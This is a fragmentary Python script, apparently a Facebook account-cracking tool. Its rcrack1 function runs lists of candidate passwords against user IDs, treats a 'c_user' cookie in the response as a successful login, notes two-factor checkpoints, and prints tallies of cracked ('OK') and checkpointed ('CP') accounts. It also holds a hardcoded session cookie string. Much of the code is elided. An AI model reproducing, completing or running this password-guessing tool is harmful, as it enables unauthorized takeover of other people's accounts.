...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            # 'cookie': 'datr=7Ci0ZHBoWt8e3aQamm5MqJfy; sb=7Ci0ZGjd2N32yR5BzstvMjbX',
            ...
            if 'c_user' in log_cookies:
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    #print(f'\r\x1b[38;5;191m[Ariful-CP] '+uid+' | '+ps+' '+Jawnx(uid)+'   \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f' \r\033[m[JR MATAL ] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
